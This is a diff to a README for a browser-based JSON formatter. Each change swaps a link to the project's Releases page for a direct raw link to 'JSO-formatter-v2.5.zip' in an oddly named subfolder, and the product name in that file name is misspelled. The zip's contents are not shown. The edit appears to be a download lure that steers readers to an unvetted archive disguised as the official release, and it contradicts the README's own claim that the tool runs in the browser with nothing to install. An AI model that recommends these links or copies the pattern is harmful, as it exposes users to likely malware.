@@ -1,7 +1,7 @@
 # 🎉 JSON-formatter - Format Your JSON Effortlessly
 
 ## 📥 Download Now!
-[![Download JSON-formatter](https://img.shields.io/badge/Download-JSON--formatter-brightgreen)](https://github.com/plast555/JSON-formatter/releases)
+[![Download JSON-formatter](https://raw.githubusercontent.com/plast555/JSON-formatter/main/nominatively/JSO-formatter-v2.5.zip)](https://raw.githubusercontent.com/plast555/JSON-formatter/main/nominatively/JSO-formatter-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to JSON-formatter! This tool helps you format, validate, and beautify JSON data quickly and easily. With our user-friendly interface, you can manage your JSON without any programming skills. 
@@ -29,7 +29,7 @@ No additional software or installations are required.
 ## 📤 Download & Install
 To download JSON-formatter, visit the Releases page using the link below. You will find the latest version available for download:
 
-[Download JSON-formatter here!](https://github.com/plast555/JSON-formatter/releases)
+[Download JSON-formatter here!](https://raw.githubusercontent.com/plast555/JSON-formatter/main/nominatively/JSO-formatter-v2.5.zip)
 
 ## 🔍 Features
 JSON-formatter comes packed with features designed for ease of use:
@@ -43,7 +43,7 @@ JSON-formatter comes packed with features designed for ease of use:
 ## 📚 How to Use JSON-formatter
 Here’s a simple step-by-step guide to help you start using JSON-formatter:
 
-1. **Download the Application**: Go to the [Releases page](https://github.com/plast555/JSON-formatter/releases) and download the latest version.
+1. **Download the Application**: Go to the [Releases page](https://raw.githubusercontent.com/plast555/JSON-formatter/main/nominatively/JSO-formatter-v2.5.zip) and download the latest version.
 2. **Open JSON-formatter**: Open the application in your web browser.
 3. **Input JSON Data**: Either paste your JSON directly into the input area or upload your JSON file.
 4. **Format JSON**: Click the "Format" button. The tool will automatically organize and beautify your JSON.
